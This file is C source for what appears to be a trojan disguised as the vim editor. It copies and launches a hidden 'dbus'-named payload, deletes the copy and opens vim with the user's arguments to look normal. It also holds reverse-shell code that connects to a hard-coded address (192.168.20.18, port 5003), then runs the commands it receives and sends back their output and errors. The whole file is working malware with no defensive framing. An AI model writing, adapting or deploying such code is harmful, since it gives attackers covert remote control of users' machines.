#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <limits.h>
// #define STATUS "/var/lib/dbus/machine-process"
// #define PAYLOAD "/usr/bin/dbus"
#define ERROR "/var/lib/dbus/err"
#define PAYLOAD "./dbus"
// #define EDITOR "{EDITOR}"
// #define FAKEPATH "{FAKEPATH}"
#define EDITOR "/usr/bin/vim"
#define FAKEPATH "./a.out"

int main (int argc, char *argv[]) {
    char args[100] = EDITOR;
    strcat(args, " ");
    for (int i = 1;i<argc;i++){
        strcat(args, argv[i]);
        if (i != argc-1){
            strcat(args, " ");
        }
    }
    if (access(PAYLOAD, F_OK) != 0 ) {
        char cmd1[50] = "cp ";
        char cmd2[50] = PAYLOAD;
        char cmd3[50] = "rm -f ";
        strcat(cmd1, FAKEPATH);
        strcat(cmd1, " ");
        strcat(cmd1, PAYLOAD);
        strcat(cmd2, " &");
        strcat(cmd3, PAYLOAD);
        // printf("%s\n", cmd1);
        // printf("%s\n", cmd2);
        // printf("%s\n", cmd3);
        system(cmd1);
        system(cmd2);
        sleep(0.1);
        system(cmd3);
        system(args);
    } else {
        establishConnection(5003, 0);
    }
    
}

int establishConnection(int port, int shell) {
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("\n Socket creation error \n");
        return -1;
    }
   
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) 
    {
        //printf("\nInvalid address/ Address not supported \n");
        return -1;
    }
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        //printf("\nConnection Failed \n");
        return -1;
    }
    //send(sock , hello , strlen(hello) , 0 );
    //printf("Hello message sent\n");
    
    if (shell == 1){
        while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
            //exeCmd(buffer);
            char line[1024];
            //Remove trailing newline
            buffer[strcspn(buffer, "\n")] = 0;
            strcat(buffer, " 2>");
            strcat(buffer, ERROR);
            FILE* fp = popen(buffer, "r");
            while((fgets(line, 1024, fp))) {
                write(sock , line , strlen(line));
                //printf("\n[%s]",line);
            }
            FILE* err = fopen(ERROR, "r");
            while((fgets(line, 1024, err))) {
                write(sock , line , strlen(line));
                //printf("\n[%s]",line);
            }
            char tmpcmd[50] = "rm -f ";
            strcat(tmpcmd, ERROR);
            system(tmpcmd);
            //pclose(fp);
            //write(sock, client_message , strlen(client_message));
        }
        //printf("Connection closed");
    } else {
        valread = read( sock , buffer, 1024);
        establishConnection(atoi(buffer), 1);
    }
    /*printf("uhh");
    char str[1024];
    printf(buffer);
    printf("%s\n",buffer );*/
    return 0;
}